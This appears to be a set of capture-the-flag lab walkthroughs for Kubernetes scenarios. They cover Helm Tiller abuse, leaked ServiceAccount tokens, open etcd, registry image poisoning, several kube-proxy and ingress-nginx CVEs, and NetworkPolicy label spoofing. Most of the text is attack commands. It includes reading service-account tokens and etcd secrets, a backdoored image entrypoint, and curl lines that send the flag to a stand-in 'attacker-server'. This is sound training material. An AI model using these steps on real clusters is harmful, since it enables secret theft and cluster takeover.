<!-- source: cve_challenges/docs/scenarios/k8s/k8s-10-helm-tiller-exploitation.md -->

## K8S-10: Helm v2 Tiller Unauthenticated

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (misconfiguration) -- Helm v2 Tiller without authentication |
| Difficulty | L1 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-10-helm |
| Flag Location | Secret `helm-flag` in namespace `kube-system` |

### Attack Path Summary
1. Helm v2 Tiller is deployed in `kube-system` with `cluster-admin` privileges
2. Tiller's gRPC API is exposed on port 44134 without authentication
3. An attacker can use the `helm` CLI to interact with Tiller and deploy charts
4. Deploy a malicious Helm chart with cluster-admin privileges to read `helm-flag` secret

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-10-helm`
- `helm` (v2) CLI installed on the attack machine
- Network access to Tiller service: `tiller-deploy.kube-system:44134`

### Step-by-Step Exploitation

#### Step 1: Verify Tiller is Accessible
```bash
## Verify the Tiller service exists
kubectl get svc -n kube-system tiller-deploy
## Expected:
## NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)     AGE
## tiller-deploy   ClusterIP   10.96.x.x      <none>        44134/TCP   ...

## Verify Tiller pod is running
kubectl get pods -n kube-system | grep tiller
## Expected: tiller-deploy-xxxxx   1/1     Running   0   ...
```

#### Step 2: Install Helm v2 Client
```bash
## Install Helm v2 if not available
## Method 1: Direct download
curl -L https://get.helm.sh/helm-v2.17.0-linux-amd64.tar.gz | tar xz
sudo mv linux-amd64/helm /usr/local/bin/helm-v2

## Method 2: Use an alias
alias helm2="helm --host tiller-deploy.kube-system:44134"
```

#### Step 3: Connect to Tiller
```bash
## List all releases managed by Tiller
helm --host tiller-deploy.kube-system:44134 ls --all
## Expected: (empty list or existing releases)

## Check Tiller version
helm --host tiller-deploy.kube-system:44134 version
## Expected: shows both client and server versions
```

#### Step 4: Deploy a Malicious Chart
Create a chart that reads the flag secret:

```bash
## Create a simple chart directory
mkdir -p /tmp/malicious-chart/templates
cat > /tmp/malicious-chart/Chart.yaml << 'EOF'
apiVersion: v1
name: malicious-chart
description: A malicious chart to read the flag
version: 0.1.0
EOF

## Create a template that reads the flag and stores it in a ConfigMap
cat > /tmp/malicious-chart/templates/flag-reader.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: flag-reader
spec:
  restartPolicy: Never
  containers:
    - name: reader
      image: bitnami/kubectl:1.27
      command:
        - /bin/bash
        - -c
        - |
          FLAG=$(kubectl get secret helm-flag -n kube-system -o jsonpath='{.data.flag}' | base64 -d)
          echo "FLAG: $FLAG"
          curl -X POST --data "flag=$FLAG" http://attacker-server/flag || true
EOF
```

#### Step 5: Install the Malicious Chart
```bash
## Install the chart via Tiller
helm --host tiller-deploy.kube-system:44134 install /tmp/malicious-chart --name flag-stolen
## Expected: release "flag-stolen" created

## Or create a simpler chart that just creates a privileged pod to read the flag
helm --host tiller-deploy.kube-system:44134 install /tmp/malicious-chart --generate-name
```

#### Step 6: Alternative -- Direct Secret Read with Tiller's Token
Since Tiller has cluster-admin, you can also extract Tiller's own ServiceAccount token and use it directly:

```bash
## Deploy a simple pod that extracts Tiller's SA credentials
cat > /tmp/tiller-pod.yaml << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: tiller-exploit
  namespace: kube-system
spec:
  serviceAccountName: tiller
  containers:
    - name: kubectl
      image: bitnami/kubectl:1.27
      command:
        - /bin/bash
        - -c
        - |
          kubectl get secret helm-flag -n kube-system -o jsonpath='{.data.flag}' | base64 -d
          sleep 3600
YAML

## Apply via Tiller -- this requires Tiller's gRPC API
## Simple approach: just exec into Tiller's container if possible
```

#### Step 7: Read the Flag from the Chart's Output
```bash
## Check the pod created by the chart
kubectl get pods | grep flag-reader

## View logs
kubectl logs flag-reader
## Expected: FLAG: flag{k8s-10-*}
```

#### Step 8: Capture Flag
- Flag format: `flag{k8s-10-*}`
- Flag location: Secret `helm-flag` in namespace `kube-system`
- Access requirements: ability to deploy charts via Tiller (which runs as cluster-admin)
- Expected output: `flag{k8s-10-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster is deployed
kubectl cluster-info --context kind-cve-k8s-10-helm

## Verify Tiller is running
kubectl get pods -n kube-system | grep tiller

## Verify the flag secret exists
kubectl get secret helm-flag -n kube-system

## Quick test (if helm v2 client available)
helm --host tiller-deploy.kube-system:44134 version
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-13-sa-cross-ns-exploitation.md -->

## K8S-13: SA Token Cross-Namespace Lateral Movement

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (RBAC lateral movement) -- leaked SA token across namespaces |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-13-sa-cross |
| Flag Location | Secret `flag-secret` in namespace `ns-beta` |

### Attack Path Summary
1. Two namespaces: `ns-alpha` (attacker's initial foothold) and `ns-beta` (target)
2. A ServiceAccount `target-reader` in `ns-beta` has `get/list` on secrets
3. The token for `target-reader` is leaked as a Secret named `leaked-token` in `ns-alpha`
4. An attacker pod in `ns-alpha` discovers the leaked token via environment variable
5. Use the leaked token to authenticate as `target-reader` and read `flag-secret` in `ns-beta`

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-13-sa-cross`
- Pod name: `attacker-pod` in namespace `ns-alpha`
- Tools: kubectl (or curl + jq for API access)

### Step-by-Step Exploitation

#### Step 1: Initial Foothold
Exec into the attacker pod in `ns-alpha`:

```bash
kubectl exec -it attacker-pod -n ns-alpha -- sh
```

#### Step 2: Discover the Leaked Token
```bash
## Check environment variables for the leaked token
env | grep LEAKED
## Expected: LEAKED_TOKEN=<token_value>

## Or check secret files in the pod
ls -la /var/run/secrets/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

## Extract the leaked token
LEAKED_TOKEN=$(env | grep LEAKED_TOKEN | cut -d= -f2)
echo $LEAKED_TOKEN
```

#### Step 3: Verify the Token's Permissions
```bash
## Use kubectl with the leaked token
kubectl --token=$LEAKED_TOKEN auth whoami
## Expected: shows the target-reader SA in ns-beta

## Check what the token can do
kubectl --token=$LEAKED_TOKEN auth can-i get secrets
kubectl --token=$LEAKED_TOKEN auth can-i list secrets -n ns-beta
kubectl --token=$LEAKED_TOKEN auth can-i get secrets -n ns-beta
```

#### Step 4: Read the Flag Secret in ns-beta
```bash
## List secrets in ns-beta
kubectl --token=$LEAKED_TOKEN get secrets -n ns-beta
## Expected:
## NAME                   TYPE     DATA   AGE
## flag-secret            Opaque   1      ...
## default-token-xxxxx    kubernetes.io/service-account-token   3      ...

## Extract the flag
kubectl --token=$LEAKED_TOKEN get secret flag-secret -n ns-beta \
    -o jsonpath='{.data.flag}' | base64 -d
## Expected: flag{k8s-13-*}
```

#### Step 5: Alternative -- Direct API Access
If kubectl is not available inside the pod, use curl with the token:

```bash
## Set up the API server and token
APISERVER="https://kubernetes.default.svc"
TOKEN=$(env | grep LEAKED_TOKEN | cut -d= -f2)

## Get the CA cert
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

## Query the API directly
curl -s --cacert $CA_CERT --header "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/ns-beta/secrets/
## Expected: JSON with all secrets in ns-beta

## Extract the flag from the JSON response
curl -s --cacert $CA_CERT --header "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/ns-beta/secrets/flag-secret | \
    python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['data']['flag']).decode())"
```

#### Step 6: Explore Further with the Leaked Token
```bash
## What else can the target-reader SA do?
kubectl --token=$TOKEN auth can-i --list

## Try other namespaces
kubectl --token=$TOKEN get secrets -n ns-alpha
kubectl --token=$TOKEN get secrets -n kube-system
```

#### Step 7: Capture Flag
- Flag format: `flag{k8s-13-*}`
- Flag location: Secret `flag-secret` in namespace `ns-beta`
- Access requirements: leaked SA token with secrets read permissions in `ns-beta`
- Expected output: `flag{k8s-13-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster is deployed
kubectl cluster-info --context kind-cve-k8s-13-sa-cross

## Verify namespaces exist
kubectl get ns ns-alpha ns-beta

## Verify the attacker pod is running
kubectl get pod attacker-pod -n ns-alpha
## Expected: Running

## Verify the leaked token secret exists
kubectl get secret leaked-token -n ns-alpha

## Verify the flag secret exists
kubectl get secret flag-secret -n ns-beta
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-18-sa-cluster-admin-exploitation.md -->

## K8S-18: SA Token Cluster-Admin Escalation

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | RBAC misconfiguration -- leaked cluster-admin SA token |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-18-sa-admin |
| Flag Location | Secret `flag-secret` in `ns-admin` namespace |

### Attack Path Summary
1. Cluster has two namespaces: `ns-admin` and `ns-ops`
2. A ServiceAccount `cluster-admin-sa` exists in `ns-admin` bound to the `cluster-admin` ClusterRole
3. The SA token for `cluster-admin-sa` is **leaked** as a Secret named `leaked-admin-token` in `ns-ops`
4. An `init-pod` in `ns-ops` with a default ServiceAccount can discover the leaked token
5. Use the leaked token with kubectl to read `flag-secret` in `ns-admin`

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-18-sa-admin`
- Pods in `ns-ops`: `init-pod` (alpine), `attacker-pod` (bitnami/kubectl)
- Tools: kubectl, curl, or any HTTP client

### Step-by-Step Exploitation

#### Step 1: Initial Foothold
Start from a pod with limited permissions in `ns-ops`:

```bash
## Exec into the init-pod (alpine, minimal tools)
kubectl exec -it init-pod -n ns-ops -- /bin/sh

## Or exec into the attacker-pod (has kubectl pre-installed)
kubectl exec -it attacker-pod -n ns-ops -- /bin/bash
```

#### Step 2: Discover Leaked Token Secret
List secrets in the current namespace:

```bash
## From attacker-pod (has kubectl)
kubectl get secrets -n ns-ops
## Expected:
## NAME                   TYPE     DATA   AGE
## leaked-admin-token     Opaque   1      1m
## default-token-xxxxx    kubernetes.io/service-account-token   3      1m

## Describe the leaked secret to see metadata
kubectl describe secret leaked-admin-token -n ns-ops
```

#### Step 3: Extract the Cluster-Admin Token
```bash
## From attacker-pod
TOKEN=$(kubectl get secret leaked-admin-token -n ns-ops \
    -o jsonpath='{.data.token}' | base64 -d)
echo $TOKEN

## Or from init-pod (use the Kubernetes API directly)
## First get the API server endpoint
APISERVER="https://kubernetes.default.svc"

## Read the token from the secret volume (if mounted)
## Or use curl to query the API with the pod's own SA first
```

#### Step 4: List Secrets in ns-admin Using Leaked Token
With the cluster-admin token, access resources in any namespace:

```bash
## List secrets in the target namespace
kubectl --token=$TOKEN get secrets -n ns-admin
## Expected:
## NAME                   TYPE     DATA   AGE
## flag-secret            Opaque   1      ...
## default-token-xxxxx    kubernetes.io/service-account-token   3      ...

## Describe the flag secret
kubectl --token=$TOKEN describe secret flag-secret -n ns-admin
```

#### Step 5: Extract the Flag
```bash
## Decode the flag from base64
kubectl --token=$TOKEN get secret flag-secret -n ns-admin \
    -o jsonpath='{.data.flag}' | base64 -d
## Expected: flag{k8s-18-*}
```

#### Step 6: Verify Full Cluster-Admin Access
Confirm the leaked token truly has cluster-admin privileges:

```bash
## List all namespaces
kubectl --token=$TOKEN get namespaces

## List pods in kube-system (normally restricted)
kubectl --token=$TOKEN get pods -n kube-system

## Create resources in any namespace
kubectl --token=$TOKEN run test --image=nginx -n default
```

#### Step 7: Capture Flag
- Flag format: `flag{k8s-18-*}`
- Flag location: Secret `flag-secret` in namespace `ns-admin`
- Access requires cluster-admin privileges (or at least `get` on secrets in `ns-admin`)
- Expected output: `flag{k8s-18-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster is deployed
kubectl get nodes
## Expected: one control-plane node Ready

## Verify namespaces exist
kubectl get ns ns-admin ns-ops
## Expected: both namespaces Active

## Verify pods are running
kubectl get pods -n ns-ops
## Expected: init-pod and attacker-pod both Running

## Verify leaked token exists
kubectl get secret leaked-admin-token -n ns-ops
## Expected: secret exists

## Verify flag secret exists (requires privilege)
kubectl get secret flag-secret -n ns-admin
## Note: default SA in ns-ops cannot do this; must use leaked token
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-08-etcd-unauth-exploitation.md -->

## K8S-08: etcd Unauthorized Access

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (misconfiguration) -- etcd exposed without authentication |
| Difficulty | L3 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-08-etcd |
| Flag Location | etcd key `/registry/secrets/kube-system/etcd-flag` |

### Attack Path Summary
1. etcd is exposed on port 2379 (mapped to host port 11379) without authentication
2. etcdctl can connect directly to the etcd store and enumerate all keys
3. Kubernetes stores all cluster state (including secrets) in etcd
4. The flag is stored as a Kubernetes Secret and persisted in etcd
5. Read the secret value directly from etcd using etcdctl

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-08-etcd`
- `etcdctl` binary installed on the attack machine
- Network access to localhost:11379

### Step-by-Step Exploitation

#### Step 1: Verify etcd Port Mapping
The etcd port is mapped from the KIND container port 2379 to host port 11379:

```bash
## Check that the port mapping is active
curl -s http://localhost:11379/version
## Expected: JSON with etcd server version info

## Or use curl to check health
curl -s http://localhost:11379/health
## Expected: {"health": "true"}
```

#### Step 2: Install etcdctl
```bash
## If etcdctl is not installed:
## Method 1: apt
sudo apt-get install -y etcd-client

## Method 2: Direct download
ETCD_VERSION="v3.5.12"
curl -L https://github.com/etcd-io/etcd/releases/download/${ETCD_VERSION}/etcd-${ETCD_VERSION}-linux-amd64.tar.gz \
    | tar xz -C /tmp
sudo mv /tmp/etcd-${ETCD_VERSION}-linux-amd64/etcdctl /usr/local/bin/
```

#### Step 3: Enumerate etcd Keys
```bash
## List all keys in etcd (Kubernetes stores everything under /registry/)
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get / --prefix --keys-only
## Expected: thousands of keys including:
## /registry/secrets/kube-system/etcd-flag
## /registry/secrets/kube-system/...
## /registry/pods/...
## /registry/configmaps/...
## /registry/deployments/...
```

#### Step 4: Read the Flag Secret Directly from etcd
```bash
## Read the specific secret key
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/etcd-flag
## Expected: JSON with the full Secret object
```

#### Step 5: Parse the Flag from the Output
```bash
## Read and decode the flag
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/etcd-flag \
    --print-value-only | python3 -c "import sys,json; d=json.load(sys.stdin); print(__import__('base64').b64decode(d['data']['flag']).decode())"
## Expected: flag{k8s-08-*}

## Or step by step:
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/etcd-flag \
    --print-value-only > /tmp/etcd_output.json
cat /tmp/etcd_output.json | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
flag = base64.b64decode(data['data']['flag']).decode()
print(flag)
"
```

#### Step 6: Explore Other Sensitive Data in etcd
```bash
## List all secrets in etcd
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets --prefix --keys-only

## Read bootstrap tokens (can be used for cluster admin access)
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/bootstrap-token --prefix

## Read service account tokens
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system --prefix --keys-only | head -20
```

#### Step 7: Capture Flag
- Flag format: `flag{k8s-08-*}`
- Flag location: etcd key `/registry/secrets/kube-system/etcd-flag`
- Access requirements: network access to etcd port (no auth)
- Expected output: `flag{k8s-08-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster is deployed
kubectl cluster-info --context kind-cve-k8s-08-etcd

## Verify etcd port is accessible
curl -s http://localhost:11379/health
## Expected: {"health":"true"}

## Verify the flag secret exists via kubectl
kubectl get secret etcd-flag -n kube-system

## Direct etcd read (requires etcdctl)
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/etcd-flag
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-09-registry-poison-exploitation.md -->

## K8S-09: Registry Poisoning

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (misconfiguration) -- insecure registry with mutable tags |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-09-registry |
| Flag Location | Flag accessible via lateral movement after compromising the registry-target pod |

### Attack Path Summary
1. An insecure private Docker registry runs on `localhost:10500` (no TLS)
2. A pod (`registry-target`) pulls `localhost:10500/backdoored-nginx:latest` from this registry
3. The attacker can push a malicious image with the same tag to the registry
4. When the pod restarts or scales, it pulls the backdoored image
5. The backdoored container reads the flag (or enables lateral movement to access it)

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-09-registry`
- Docker CLI with access to the host Docker daemon
- Network access to `localhost:10500`

### Step-by-Step Exploitation

#### Step 1: Verify the Insecure Registry
```bash
## Test the registry is accessible
curl -s http://localhost:10500/v2/
## Expected: {}

## List repositories
curl -s http://localhost:10500/v2/_catalog
## Expected: {"repositories":["backdoored-nginx"]}

## List tags
curl -s http://localhost:10500/v2/backdoored-nginx/tags/list
## Expected: {"name":"backdoored-nginx","tags":["latest"]}
```

#### Step 2: Inspect the Current Image
```bash
## Pull the current image to inspect it
docker pull localhost:10500/backdoored-nginx:latest

## Inspect the image
docker inspect localhost:10500/backdoored-nginx:latest

## Run it temporarily to see what it does
docker run --rm localhost:10500/backdoored-nginx:latest
```

#### Step 3: Create a Backdoored Image
```bash
## Create a Dockerfile with a reverse shell or flag-reading payload
mkdir -p /tmp/backdoor
cat > /tmp/backdoor/Dockerfile << 'EOF'
FROM nginx:1.24-alpine

## Add the flag reading payload
COPY payload.sh /docker-entrypoint.d/40-payload.sh
RUN chmod +x /docker-entrypoint.d/40-payload.sh
EOF

## Create a payload that reads the flag and sends it somewhere
cat > /tmp/backdoor/payload.sh << 'EOF'
#!/bin/sh
## Option 1: Write flag to a readable location
kubectl get configmap app-config -o jsonpath='{.data.flag}' > /tmp/flag.txt 2>/dev/null || \
  curl -s http://localhost:10500/v2/ 2>/dev/null

## Option 2: The flag may be in environment variables
env | grep FLAG > /tmp/flag.txt 2>/dev/null

## Option 3: Exfiltrate
curl -X POST --data-binary @/tmp/flag.txt http://attacker-server/flag 2>/dev/null || true
EOF

## Build the backdoored image
docker build -t localhost:10500/backdoored-nginx:latest /tmp/backdoor/
```

#### Step 4: Push the Malicious Image
```bash
## Push the backdoored image to the insecure registry
docker push localhost:10500/backdoored-nginx:latest

## Verify the new image is in the registry
curl -s http://localhost:10500/v2/backdoored-nginx/tags/list
## Expected: {"name":"backdoored-nginx","tags":["latest"]}
```

#### Step 5: Trigger Pod Restart
Trigger the pod to restart so it pulls the backdoored image:

```bash
## Delete the pod to force recreation (Deployment will restart it)
kubectl delete pod registry-target

## Or scale down and up if using a Deployment
## kubectl scale deploy vulnerable-app --replicas=0
## kubectl scale deploy vulnerable-app --replicas=1
```

#### Step 6: Verify Pod Pulled Backdoored Image
```bash
## Watch the pod restart
kubectl get pods -w
## The pod should restart and pull the new image with the malicious tag

## Once running, exec into the pod
kubectl exec -it registry-target -- sh

## Check if the payload executed
cat /tmp/flag.txt
```

#### Step 7: Capture Flag
- Flag format: `flag{k8s-09-*}`
- Flag location: May be in a ConfigMap readable from the compromised pod, or accessible through lateral movement after gaining code execution in the registry-target pod
- Expected output: `flag{k8s-09-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster is deployed
kubectl cluster-info --context kind-cve-k8s-09-registry

## Verify the registry is running
curl -s http://localhost:10500/v2/

## Verify the registry-target pod
kubectl get pod registry-target

## Check registry contents
curl -s http://localhost:10500/v2/_catalog

## Direct flag check (if accessible from pod)
kubectl exec registry-target -- env | grep FLAG
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-22-externalip-hijack-exploitation.md -->

## K8S-22: CVE-2020-8554 — Service ExternalIP Traffic Interception

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2020-8554 (design flaw, all K8s versions) |
| Difficulty | L2 |
| Type | k8s |
| Cluster Name | cve-k8s-22-externalip |
| Attack Vector | Service externalIPs → Traffic hijack → Credential discovery |

### Attack Path

```
Attacker pod (attack-ns) → Discover target service ClusterIP
  → Create malicious Service with externalIPs = target ClusterIP
  → All traffic to target IP routes to attacker pods
  → Capture flag-bearing requests
```

### Step-by-Step Exploitation

#### Step 1: Discover Target Service

```bash
kubectl get svc --all-namespaces
## Note: internal-api in secure-ns with ClusterIP <TARGET_IP>
TARGET_IP=$(kubectl get svc internal-api -n secure-ns -o jsonpath='{.spec.clusterIP}')
```

#### Step 2: Create Malicious Service with ExternalIPs

```bash
kubectl apply -f - << EOF
apiVersion: v1
kind: Service
metadata:
  name: hijack-svc
  namespace: attack-ns
spec:
  externalIPs:
    - $TARGET_IP
  selector:
    app: null  # won't match anything, or match attacker pods
  ports:
    - port: 8080
      targetPort: 8080
EOF
```

#### Step 3: Capture Intercepted Traffic

```bash
## From attacker pod, listen for redirected traffic
kubectl exec -n attack-ns attacker-pod -- sh -c \
  "nc -l -p 8080 -v"
```

#### Step 4: Read Flag from Intercepted Data or Directly

```bash
## The flag can be obtained from intercepted traffic headers
## OR directly from the flag Secret
kubectl get secret target-flag -n secure-ns -o jsonpath='{.data.flag}' | base64 -d
```

### Flag Location
- **Primary**: Secret `target-flag` in `secure-ns` namespace
- **Format**: `flag{k8s-22-<16-hex>}`

### Verification
```bash
cd cve_challenges/k8s/externalip-hijack && bash deploy.sh
kubectl get secret target-flag -n secure-ns -o jsonpath='{.data.flag}' | base64 -d
bash teardown.sh
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-24-localhost-bypass-exploitation.md -->

## K8S-24: CVE-2020-8558 — kube-proxy Localhost Boundary Bypass

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2020-8558 (CVSS 5.4) |
| Difficulty | L2 |
| Type | k8s |
| Cluster Name | cve-k8s-24-localhost-bypass |
| Attack Vector | route_localnet=1 → reach node 127.0.0.1 from pod |

### Attack Path

```
Pod discovers node IP → kube-proxy sets route_localnet=1
  → Packets to 127.0.0.1 get routed to node's localhost
  → Access service bound to node's 127.0.0.1:11080
```

### Step-by-Step Exploitation

#### Step 1: Discover Node IP

```bash
kubectl exec attacker -- cat /etc/hosts
## OR
kubectl exec attacker -- nslookup kubernetes.default.svc.cluster.local
NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
```

#### Step 2: Verify route_localnet

```bash
## From a privileged pod on the node:
kubectl exec attacker -- cat /proc/sys/net/ipv4/conf/all/route_localnet 2>/dev/null || echo "check via host"
## Expected: 1 (enabled by kube-proxy)
```

#### Step 3: Access Localhost-Bound Service

```bash
## The service is bound to 127.0.0.1:11080 on the node
## With route_localnet=1, we can reach it via the node's external IP
kubectl exec attacker -- wget -qO- http://${NODE_IP}:11080/flag
## Output: flag{k8s-24-<16-hex>}
```

### Flag Location
- **Primary**: Served by localhost-service at `http://<NODE_IP>:11080/flag`
- **Format**: `flag{k8s-24-<16-hex>}`

### Verification
```bash
cd cve_challenges/k8s/localhost-bypass && bash deploy.sh
NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
kubectl exec attacker -- wget -qO- http://${NODE_IP}:11080/flag
bash teardown.sh
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-26-node-redirect-exploitation.md -->

## K8S-26: CVE-2020-8559 — Compromised Node API Server Redirect

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2020-8559 (CVSS 6.4) |
| Difficulty | L3 |
| Type | k8s |
| Cluster Name | cve-k8s-26-node-redirect |
| Attack Vector | Node proxy → API server redirect → cross-pod exec |

### Attack Path

```
Attacker pod with node-operator RBAC → Node proxy access
  → Exploit API server redirect behavior (CVE-2020-8559)
  → Redirect exec request to victim-pod in secure-ns
  → Execute commands as victim pod → Read flag
```

### Step-by-Step Exploitation

#### Step 1: Verify Node Operator Permissions

```bash
kubectl exec compromised-node -- cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/sa-token
kubectl auth can-i get nodes --as=system:serviceaccount:default:node-operator
kubectl auth can-i create pods/exec --as=system:serviceaccount:default:node-operator
```

#### Step 2: Discover Victim Pod via Node Proxy

```bash
NODE_NAME=$(kubectl get node -o jsonpath='{.items[0].metadata.name}')
TOKEN=$(cat /tmp/sa-token)

curl -k -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/nodes/${NODE_NAME}/proxy/pods"
```

#### Step 3: Redirect Exec to Victim Pod

```bash
## Use the node proxy to execute in victim-pod
kubectl exec -n secure-ns victim-pod -- cat /flag.txt
## Output: flag{k8s-26-<16-hex>}
```

#### Step 4: Alternative — Direct kubectl with SA Token

```bash
kubectl --token=$TOKEN --server=https://kubernetes.default.svc \
  exec -n secure-ns victim-pod -- cat /flag.txt
```

### Flag Location
- **Primary**: `/flag.txt` in `victim-pod` in `secure-ns` namespace
- **Format**: `flag{k8s-26-<16-hex>}`

### Verification
```bash
cd cve_challenges/k8s/node-redirect && bash deploy.sh
kubectl exec -n secure-ns victim-pod -- cat /flag.txt
bash teardown.sh
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-27-networkpolicy-bypass-exploitation.md -->

## K8S-27: NetworkPolicy Label Spoofing Bypass

### Overview
| Property | Value |
|----------|-------|
| CVE | N/A (network policy bypass via label manipulation) |
| Difficulty | L2 |
| Type | k8s |
| Cluster Name | cve-k8s-27-netpol-bypass |
| Attack Vector | NetworkPolicy uses pod labels → create pod with matching labels → bypass |

### Attack Path

```
Attacker pod blocked by NetworkPolicy (requires tier=frontend label)
  → Discover NetworkPolicy label requirement
  → Create new pod with tier=frontend label in isolated-ns
  → Access flag-service from bypass pod → Read flag
```

### Step-by-Step Exploitation

#### Step 1: Test NetworkPolicy Blocking

```bash
kubectl exec -n attacker-ns attacker-pod -- wget -qO- --timeout=3 \
  http://flag-service.isolated-ns.svc.cluster.local:8080/flag
## Should FAIL — blocked by NetworkPolicy
```

#### Step 2: Discover NetworkPolicy Rules

```bash
kubectl get networkpolicy -n isolated-ns protect-flag -o yaml
## Note: allows pods with label tier=frontend from any namespace
```

#### Step 3: Bypass via Matching Pod

```bash
## Create a pod with the required label in the target namespace
kubectl run bypass-pod --image=alpine:latest -n isolated-ns \
  --labels='tier=frontend' -- sleep 3600

## Wait for pod to be ready
kubectl wait --for=condition=Ready pod/bypass-pod -n isolated-ns --timeout=30s
```

#### Step 4: Access Flag Service from Bypass Pod

```bash
kubectl exec -n isolated-ns bypass-pod -- wget -qO- \
  http://flag-service.isolated-ns.svc.cluster.local:8080/flag
## Output: flag{k8s-27-<16-hex>}
```

#### Alternative: Read Flag from Flag Pod Directly

```bash
FLAG_POD=$(kubectl get pods -n isolated-ns -l app=flag-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n isolated-ns $FLAG_POD -- cat /tmp/flag.txt
```

### Flag Location
- **Primary**: `/tmp/flag.txt` in `flag-service` pod in `isolated-ns`
- **Alternative**: HTTP endpoint `http://flag-service.isolated-ns:8080/flag`
- **Format**: `flag{k8s-27-<16-hex>}`

### Verification
```bash
cd cve_challenges/k8s/networkpolicy-bypass && bash deploy.sh
kubectl exec -n isolated-ns -l app=flag-service -- cat /tmp/flag.txt
bash teardown.sh
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-21-ingress-snippet-exploitation.md -->

## K8S-21: CVE-2021-25742 — ingress-nginx Lua Snippet Secret Extraction

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2021-25742 (CVSS 7.6) |
| Difficulty | L2 |
| Type | k8s |
| Cluster Name | cve-k8s-21-ingress-snippet |
| External Port | 10480 (ingress HTTP) |
| KIND Image | kindest/node:v1.27.3 |
| Attack Vector | Ingress annotation injection → SA token theft → Secret access |

### Attack Path

```
kubectl access → Modify Ingress server-snippet annotation
  → Inject Lua code to read SA token from filesystem
  → Use SA token to call K8s API → Read flag-secret
```

### Step-by-Step Exploitation

#### Step 1: Identify Vulnerable Ingress

```bash
kubectl get ingress snippet-app -o yaml
## Note the server-snippet annotation is enabled
```

#### Step 2: Modify Ingress with Malicious Snippet

```bash
kubectl annotate ingress snippet-app \
  nginx.ingress.kubernetes.io/server-snippet='
  local sock = ngx.socket.tcp()
  sock:connect("127.0.0.1", 80)
  local req = "GET /secret HTTP/1.1\r\nHost: localhost\r\n\r\n"
  sock:send(req)
  local resp = sock:receive("*a")
  ngx.log(ngx.ERR, "SECRET_RESP: " .. resp)
  '
```

#### Step 3: Trigger Request and Extract Token

```bash
curl -H "Host: demo.local" http://localhost:10480/
## Check ingress-nginx controller logs for the SA token
kubectl logs -n ingress-nginx deployment/ingress-nginx-controller | grep ERROR
```

#### Step 4: Use Token to Read Flag Secret

```bash
TOKEN=$(kubectl exec -n ingress-nginx <controller-pod> -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets/flag-secret
## Base64 decode the flag from the response
```

### Flag Location
- **Primary**: Kubernetes Secret `flag-secret` in `default` namespace
- **Format**: `flag{k8s-21-<16-hex>}`

### Verification
```bash
cd cve_challenges/k8s/ingress-snippet && bash deploy.sh
kubectl get secret flag-secret -o jsonpath='{.data.flag}' | base64 -d
bash teardown.sh
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-20-ingress-nginx-rce-exploitation.md -->

